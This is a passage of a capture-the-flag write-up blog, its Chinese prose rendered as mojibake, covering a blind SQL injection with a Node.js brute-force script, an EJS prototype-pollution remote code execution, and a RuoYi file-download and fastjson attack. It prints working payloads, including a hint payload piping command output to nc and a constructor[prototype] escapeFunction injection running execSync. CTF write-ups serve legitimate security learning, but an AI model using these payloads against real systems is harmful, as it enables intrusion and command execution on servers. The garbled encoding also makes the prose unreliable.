ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„é—®é¢˜ï¼š</p><ul><li>ç¬¦å·æ¯”è¾ƒï¼ˆ&lt;ç¬¦å·çš„é—®é¢˜ï¼Œåœ¨çˆ†æœ€åä¸€ä½æ—¶ä¸å‰é¢ä¸åŒ</li><li>å¤§å°å†™é—®é¢˜ï¼ˆå‘æ­»æˆ‘äº†ï¼Œ<strong>ç”¨binaryâ€™â€™æ¥è§£å†³</strong></li><li>è¯¦æƒ…çœ‹èµ„æ–™</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]<br>row_constructor_list:<br>    ROW(value_list)[ï¼ŒROW(value_list)][ï¼Œ...]<br><br>value_list:<br>    value[ï¼Œvalue][ï¼Œ...]<br><br>column_designator:<br>    column_index<br># ä½†è¿™é¢˜æˆ‘æ²¡ç”¨åˆ°valueï¼Œä¸å¤ªæ‡‚å…·ä½“ç”¨æ³•<br></code></pre></td></tr></table></figure></blockquote><p>ä»¥åŠæ–°çš„è¡¨<code>information_schema.TABLESPACES_EXTENSIONS</code></p><p><code>information_schema.TABLESPACES_EXTENSIONS</code>ä¸€æ¬¡æ€§å‚¨å­˜äº†æ•°æ®åº“åå’Œè¡¨å</p><p>ä¸å¤šè¯´ï¼Œä¸Šæ‰‹å®æ“æ‰æ˜¯çœŸç†</p><p>è¾“å…¥<code>1 and 1=1 #</code>æ­£å¸¸å›æ˜¾ </p><p>è€Œ<code>1 and 1=2 #</code>ä¸å›æ˜¾</p><p>æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œå°è¯•<code>order by</code>ï¼Œ<code>union</code>ï¼Œ<code>select</code>å‘ç°éƒ½è¢«è¿‡æ»¤äº†</p><p>é‚£å°±é çŒœçš„å§</p><p><code>id=1 and (&#39;&#39;,&#39;&#39;)&lt;=(table information_schema.TABLESPACES_EXTENSIONS limit 0,1) #</code>æ—¶æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æœ‰ä¸¤åˆ—</p><p>å½“æ—¶å†™å®Œä¹‹åæ‰æƒ³èµ·æ¥å¯ä»¥ç”¨è„šæœ¬ï¼Œå¤´é“ğŸ˜¢ğŸ˜¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ä¸å¦‚æ‰‹æ³¨</span><br><br><span class="hljs-keyword">var</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sync-request&#x27;</span>)<br><span class="hljs-keyword">let</span> arr = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">45</span>; j &lt; <span class="hljs-number">126</span>; j++) &#123;<br>    arr[i] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j)<br>    <span class="hljs-comment">// console.log(arr.join(&#x27;&#x27;))</span><br>    <span class="hljs-comment">// url = `http://124.221.34.13:55553/?id=1 and (binary&#x27;$&#123;arr.join(&#x27;&#x27;)&#125;&#x27;,&#x27;&#x27;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 10,1) #`</span><br>    url = <span class="hljs-string">`http://124.221.34.13:55553/?id=1 and (&#x27;9&#x27;,binary&#x27;<span class="hljs-subst">$&#123;arr.join(</span></span><br><span class="hljs-subst"><span class="hljs-string">      <span class="hljs-string">&#x27;&#x27;</span></span></span><br><span class="hljs-subst"><span class="hljs-string">    )&#125;</span>&#x27;)&lt;(table cn55 limit 8,1) #`</span><br>    <span class="hljs-keyword">var</span> res = <span class="hljs-title function_">request</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, url, &#123;<br>      <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>,<br>    &#125;)<br>    <span class="hljs-comment">//console.log(String.fromCharCode(j - 1))</span><br>    arr[i] = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (<br>      !res.<span class="hljs-title function_">getBody</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;psych&#x27;</span>) &amp;&amp;<br>      !res.<span class="hljs-title function_">getBody</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>) &amp;&amp;<br>      j != <span class="hljs-number">92</span><br>    ) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j - <span class="hljs-number">1</span>))<br>      arr[i] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j - <span class="hljs-number">1</span>)<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!arr[i]) &#123;<br>    arr[i - <span class="hljs-number">1</span>] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(arr[i - <span class="hljs-number">1</span>].<span class="hljs-title function_">charCodeAt</span>() + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">break</span><br>  &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸ªè¯•è¿‡å»</p><p><code>?id=1 and (binary&#39;$&#123;arr.join(&#39;&#39;)&#125;&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 10,1) #</code></p><p>åº“&#x2F;è¡¨</p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">mysql</td></tr><tr><td align="center">2</td><td align="center">innodb_system</td></tr><tr><td align="center">3</td><td align="center">innodb_temporary</td></tr><tr><td align="center">4</td><td align="center">innodb_undo_001</td></tr><tr><td align="center">5</td><td align="center">innodb_undo_002</td></tr><tr><td align="center">6</td><td align="center">sys&#x2F;sys_config</td></tr><tr><td align="center">7</td><td align="center">cnss&#x2F;users</td></tr><tr><td align="center">8</td><td align="center">cnss&#x2F;cn55</td></tr><tr><td align="center">9</td><td align="center">cnss&#x2F;uagents</td></tr><tr><td align="center">10</td><td align="center">cnss&#x2F;referers</td></tr></tbody></table><p>å¯ä»¥çŒœåˆ°flagåº”è¯¥åœ¨cnss&#x2F;cn55ä¸­</p><p><code>http://124.221.34.13:55553/?id=1 and (&#39;9&#39;,binary&#39;$&#123;arr.join(&#39;&#39;)&#125;&#39;)&lt;(table cn55 limit 8,1) #</code></p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="mailto:&#68;&#x75;&#109;&#98;&#64;&#100;&#104;&#x61;&#x6b;&#107;&#x61;&#x6e;&#x2e;&#99;&#x6f;&#x6d;">&#68;&#x75;&#109;&#98;&#64;&#100;&#104;&#x61;&#x6b;&#107;&#x61;&#x6e;&#x2e;&#99;&#x6f;&#x6d;</a></td></tr><tr><td align="center">2</td><td align="center"><a href="mailto:&#65;&#x6e;&#x67;&#101;&#108;&#64;&#105;&#108;&#x6f;&#x76;&#101;&#x75;&#46;&#x63;&#x6f;&#x6d;">&#65;&#x6e;&#x67;&#101;&#108;&#64;&#105;&#108;&#x6f;&#x76;&#101;&#x75;&#46;&#x63;&#x6f;&#x6d;</a></td></tr><tr><td align="center">3</td><td align="center"><a href="mailto:&#68;&#117;&#x6d;&#109;&#121;&#64;&#100;&#104;&#97;&#107;&#107;&#x61;&#x6e;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;">&#68;&#117;&#x6d;&#109;&#121;&#64;&#100;&#104;&#97;&#107;&#107;&#x61;&#x6e;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;</a></td></tr><tr><td align="center">4</td><td align="center"><a href="mailto:&#x73;&#x65;&#99;&#117;&#x72;&#101;&#64;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;">&#x73;&#x65;&#99;&#117;&#x72;&#101;&#64;&#x64;&#x68;&#97;&#x6b;&#x6b;&#97;&#110;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;</a></td></tr><tr><td align="center">5</td><td align="center"><a href="mailto:&#x73;&#x74;&#117;&#112;&#105;&#100;&#64;&#x64;&#x68;&#97;&#107;&#x6b;&#x61;&#110;&#46;&#108;&#111;&#x63;&#97;&#108;">&#x73;&#x74;&#117;&#112;&#105;&#100;&#64;&#x64;&#x68;&#97;&#107;&#x6b;&#x61;&#110;&#46;&#108;&#111;&#x63;&#97;&#108;</a></td></tr><tr><td align="center">6</td><td align="center"><a href="mailto:&#x73;&#117;&#x70;&#101;&#x72;&#x6d;&#x61;&#x6e;&#64;&#x64;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;">&#x73;&#117;&#x70;&#101;&#x72;&#x6d;&#x61;&#x6e;&#64;&#x64;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;</a></td></tr><tr><td align="center">7</td><td align="center"><a href="mailto:&#x62;&#97;&#116;&#x6d;&#97;&#110;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#x63;&#x61;&#108;">&#x62;&#97;&#116;&#x6d;&#97;&#110;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#x63;&#x61;&#108;</a></td></tr><tr><td align="center">8</td><td align="center">CNSS{1_want_t0_b2_b1ghacker}</td></tr></tbody></table><p>åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆè¦å…¨å†™å‡ºæ¥ï¼Œæˆ‘é—²çš„</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;1_want_t0_b2_b1ghacker&#125;</code></font></center></strong></em></p><h2 id="Hard-âœ´ï¸-EzPollution"><a href="#Hard-âœ´ï¸-EzPollution" class="headerlink" title="[Hard] âœ´ï¸ EzPollution"></a>[Hard] âœ´ï¸ EzPollution</h2><p>çœŸçš„æ˜¯å¤ªEzå•¦ï¼ˆğŸ¤ğŸ¤ğŸ¤</p><p>è§‚å¯Ÿæºç ï¼Œæ˜¯ejs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;__dirname&#125;</span>/views/index.ejs`</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;CNSS Login&#x27;</span> &#125;);<br>&#125;)<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> user = <span class="hljs-title function_">merge</span>(&#123;&#125;, req.<span class="hljs-property">query</span>)<br>    <span class="hljs-keyword">if</span> (user.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; user.<span class="hljs-property">password</span> === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Login success!&quot;</span><br>        &#125;)<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Login failed!&quot;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Not found!&quot;</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>)<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal server error!&quot;</span><br>    &#125;)<br>&#125;)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> source = <span class="hljs-variable language_">arguments</span>[i]<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> source) &#123;<br>            <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(source, key)) &#123;<br>                <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>                    <span class="hljs-title function_">merge</span>(target[key], source[key])<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    target[key] = source[key]<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">5000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;http://%s:%s&quot;</span>, host, port)<br>&#125;);<br><br></code></pre></td></tr></table></figure><ul><li>å¯ä»¥çœ‹åˆ°<code>/login</code>ä¸­ç”¨çš„æ˜¯Getè¯·æ±‚</li></ul><p>è¿™å…¶å®æ˜¯å¡æˆ‘æœ€ä¹…çš„åœ°æ–¹ğŸ«¥ğŸ«¥ğŸ«¥</p><p>ä¸æ–­å°è¯•å‘ç°ç›´æ¥<code>a[b][c]=111</code>å°±è¡Œäº†ï¼Œå¤ªç—›äº†è°æ‡‚</p><p><img src="/posts/43716/image-20231020221007760.png" alt="image-20231020221007760"></p><ul><li>å…¶æ¬¡<code>merge</code>å‡½æ•°è¿‡æ»¤äº†<code>__proto__</code>ï¼Œæ‰€ä»¥è¦æ¢ä¸ªæ–¹æ³•</li></ul><blockquote><p>æ ¹æ®hintï¼š<a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">EJS - Server Side Prototype Pollution gadgets to RCE | mizu.re</a></p></blockquote><p>å¯ä»¥çœ‹åˆ°ejsæœ‰ä¸ªæ³¨å…¥ç‚¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;id | nc localhost 4444&#x27;)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯hintä¸­ä¹Ÿæ˜¯ç”¨çš„<code>__proto__</code>ï¼Œäºæ˜¯ä¹å¼€æœ</p><blockquote><p><a href="https://juejin.cn/post/6963950629240733727">å‰ç«¯åŸå‹é“¾æ±¡æŸ“æ¼æ´ç«Ÿå¯ä»¥æ‹¿ä¸‹æœåŠ¡å™¨shellï¼Ÿ - æ˜é‡‘ (juejin.cn)</a></p></blockquote><p>å‘ç°<code>&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</code>ä¸€æ ·å¯ä»¥æ±¡æŸ“åŸå‹é“¾</p><p>é‚£åé¢å°±ç®€å•äº†</p><p>æ„é€ </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">constructor<span class="hljs-punctuation">[</span>prototype<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>client<span class="hljs-punctuation">]</span>=<span class="hljs-literal"><span class="hljs-keyword">true</span></span>&amp;constructor<span class="hljs-punctuation">[</span>prototype<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>escapeFunction<span class="hljs-punctuation">]</span>=<span class="hljs-number">1</span>; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„returnï¼Œæˆ‘æ‰¾äº†å¾ˆä¹…çš„å›æ˜¾æ–¹å¼ï¼Œå‘ç°å½“æ”»å‡»å®Œä¹‹åï¼Œåœ¨è®¿é—®ä¸€æ¬¡åˆå§‹ç½‘é¡µï¼Œå°±ä¼šè‡ªåŠ¨ä¸‹è½½å‘½ä»¤æ‰§è¡Œç»“æœ</p><p>åŸç†æˆ‘çŒœæµ‹æ˜¯</p><blockquote><p><del>å½“ç”¨escapeFnæˆªæ–­åŸå§‹å‘½ä»¤æ—¶<code>return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;whoami&#39;)</code>å°±æˆäº†å•ç‹¬çš„ä¸€æ¡å‘½ä»¤</del></p><p><del>å½“å†æ¬¡è®¿é—®ç™»å½•ç•Œé¢æ—¶ï¼Œä¼šcomplieè¢«æ±¡æŸ“çš„escapeFnä½¿è¯­å¥æ‰§è¡Œï¼Œä¹Ÿå°±ä¼šè‡ªåŠ¨ä¸‹è½½å‘½ä»¤æ‰§è¡Œç»“æœ</del></p></blockquote><p>è¯•è¿‡åå¼¹shellï¼Œä¼¼ä¹ä¸è¡Œï¼ˆæ³ªæµæ»¡é¢</p><p>ä¸ç¡®å®šå“ˆã€‚ã€‚</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;JavaScr1pt_is_4w3s0m33333&#125;</code></font></center></strong></em></p><h2 id="Hard-ğŸ¥‡-ruoyi-with-fastjson"><a href="#Hard-ğŸ¥‡-ruoyi-with-fastjson" class="headerlink" title="[Hard+] ğŸ¥‡ ruoyi with fastjson"></a>[Hard+] ğŸ¥‡ ruoyi with fastjson</h2><blockquote><p>Hint:</p><ul><li>ç¯å¢ƒ10åˆ†é’Ÿé‡ç½®ä¸€æ¬¡, è¯·ä¸è¦æ•…æ„ç ´åç¯å¢ƒæˆ–æ³„éœ²flag, <strong>æ‰€æœ‰æµé‡éƒ½å°†ä¼šè¢«è®°å½•</strong></li><li>ä»»æ„æ–‡ä»¶è¯»å– â€“&gt;flag part 1</li><li>æƒ³åŠæ³•ä»&#x2F;procæåˆ°jaråŒ…åœ¨å“ª</li><li>é€†å‘jaråŒ… â€“&gt;flag part 2</li><li>æ‰¾fastjsonååºåˆ—åŒ–ç‚¹ï¼Œæå®špayloadçš„åŠ å¯†è§£å¯†</li><li>getshell â€“&gt;flag part 3</li><li>ä¸€äº›å¯èƒ½æœ‰ç”¨çš„é¡¹ç›®åŠå·¥å…·ä¸œè¥¿ï¼š<br><code>https://github.com/welk1n/JNDI-Injection-Exploit</code><br><code>https://github.com/WhiteHSBG/JNDIExploit</code><br><code>https://github.com/pen4uin/java-memshell-generator-release</code><br><code>https://xz.aliyun.com/t/12492</code><br><code>https://xz.aliyun.com/search?keyword=fastjson</code></li></ul><p>æ²¡æœ‰å…¬ç½‘åœ°å€ï¼Œå¯ä»¥è€ƒè™‘frpï¼Œä¾‹å¦‚<code>https://www.natfrp.com/</code>ï¼Œæˆ–è€…å†…å­˜é©¬ç­‰ï¼Œå¯ä»¥å‚è€ƒæä¾›çš„é“¾æ¥2ã€3ã€4</p></blockquote><p>ruoyiç‰ˆæœ¬ä¸º4.7.6</p><blockquote><p><a href="https://www.cnblogs.com/shaoqiblog/p/17305315.html">è‹¥ä¾ 4.7.6 ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼ˆå®¡è®¡å¤ç°ï¼‰ - Tanya203 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://mp.weixin.qq.com/s/IrqLp2Z3c941NiN0fFcDMA">ã€<em>æœ€æ–°æ¼æ´å¤ç°</em>ã€‘ RuoYi ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ (qq.com)</a></p></blockquote><p>æœç´¢å¾—åˆ°æ¼æ´ä¸º<strong>ä»»æ„æ–‡ä»¶ä¸‹è½½</strong></p><p>æ ¹æ®å¤ç°æ–¹æ³•try try</p><h3 id="Flag-Part-1"><a href="#Flag-Part-1" class="headerlink" title="Flag Part 1"></a>Flag Part 1</h3><blockquote><p><strong>ç³»ç»Ÿç›‘æ§â€“&gt;å®šæ—¶ä»»åŠ¡</strong></p><p><img src="/posts/43716/image-20231020225955850.png" alt="image-20231020225955850"></p><p>ç¡®å®šï¼Œ<strong>æ›´å¤šæ“ä½œâ€“&gt;æ‰§è¡Œä¸€æ¬¡</strong></p><p>è®¿é—®<code>/common/download/resource?resource=Info.xml:.zip</code></p><p>å¾—åˆ°flag1ï¼Œ<del>æˆ‘æ‰ä¸ä¼šå‘Šè¯‰ä½ æˆ‘ä¸æ˜¯è¿™ä¹ˆè·å–çš„</del>ï¼Œæˆ‘å½“æ—¶è¯•äº†åŠå¤©å¾—ä¸åˆ°ï¼Œç›´æ¥ç¬¬äºŒé¢˜</p><p><em><strong>CNSS{Fr0M_4rb1trA2y</strong></em></p></blockquote><h3 id="Flag-Part-2"><a href="#Flag-Part-2" class="headerlink" title="Flag Part 2"></a>Flag Part 2</h3><p>æç¤º<code>/proc</code></p><blockquote><blockquote><p><a href="https://zhuanlan.zhihu.com/p/378388389">Linuxç³»ç»Ÿprocç›®å½•è¯´æ˜ - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><ol><li><p>ç”¨ä¸Šé¢çš„æ¼æ´è®¿é—®è·å¾—<code>/proc/cmdline</code></p><p>è·å¾—<code>/usr/local/jdk8/bin/java -Xms64m -Xmx512m -jar /tmp/source/ruoyi.jar </code></p></li><li><p>å¾—åˆ°<code>jar</code>åŒ…çš„è·¯å¾„ï¼š<code>/tmp/source/ruoyi.jar</code></p><p>å†ç”¨ä¸Šé¢æ¼æ´è·å¾—<code>jar</code></p></li><li><p>ä½¿ç”¨<code>idea</code></p><ol><li><p>è¿›å…¥<code>idea</code>çš„è·¯å¾„<code>IntelliJ IDEA 2023.2.3\plugins\java-decompiler\lib</code>å¯ä»¥æ³¨æ„åˆ°æ–‡ä»¶å¤¹æœ‰ä¸ª<code>java-decompiler.jar</code></p></li><li><p>æŠŠ<code>ruoyi.jar</code>å¤åˆ¶åˆ°æ­¤æ–‡ä»¶å¤¹</p></li><li><p>åˆ›å»ºä¸€ä¸ª<code>ruoyi</code>æ–‡ä»¶å¤¹</p></li><li><p>å‘½ä»¤è¡Œå†™å…¥<code>java -cp &quot;xxxx\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ruoyi.jar ruoyi</code>å›è½¦æ‰§è¡Œ</p></li><li><p>å¾—åˆ°é€†å‘çš„åŒ…ï¼Œå¹¶è§£å‹ï¼Œç”¨<code>idea</code>æ‰“å¼€</p></li><li><p>åŒå‡»<code>shift</code>ï¼Œæœç´¢<code>part2</code>ï¼Œå¾—åˆ°flag</p><p><img src="/posts/43716/image-20231020234402549.png" alt="image-20231020234402549"></p></li></ol><p><em><strong>_f1L3_Reaol_Vuln3rab1l1Ty</strong></em></p></li></ol></blockquote><h3 id="Flag-Part-3"><a href="#Flag-Part-3" class="headerlink" title="Flag Part 3"></a>Flag Part 3</h3><blockquote><blockquote><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit: JNDIæ³¨å…¥æµ‹è¯•å·¥å…·ï¼ˆA tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etcï¼‰</a></p><p>è·å–jndiå·¥å…·</p><p>JNDIæ³¨å…¥åˆ©ç”¨å·¥å…·ï¼Œç”ŸæˆJNDIé“¾æ¥å¹¶å¯åŠ¨åç«¯ç›¸å…³æœåŠ¡ï¼Œå¯ç”¨äºFastjsonã€Jacksonç­‰ç›¸å…³æ¼æ´çš„éªŒè¯ã€‚</p></blockquote><p>gitåˆ°vpsä¸Šï¼Œ<del>å˜¿å˜¿æˆ‘åœ¨æœ¬åœ°è¯•äº†åŠå¤©</del>ã€</p><p>æ ¹æ®ä¸Šé¢è·å¾—çš„æºç ï¼Œå¯çŸ¥<code>fastjson</code>çš„æ”»å‡»åœ°å€ä¸º<code>/common/sign</code>ï¼Œè¯·æ±‚æ–¹å¼ä¸º<code>POST</code>ï¼Œä¸”postçš„æ•°æ®ç»è¿‡äº†AESè§£å¯†</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆåŠ å¯†å†post</p><p>æŸ¥çœ‹<code>AESUtils.java</code>çš„<code>decryptAES</code></p><p><img src="/posts/43716/image-20231021000823583.png" alt="image-20231021000823583"></p><p>å¯ä»¥çœ‹åˆ°åŠ 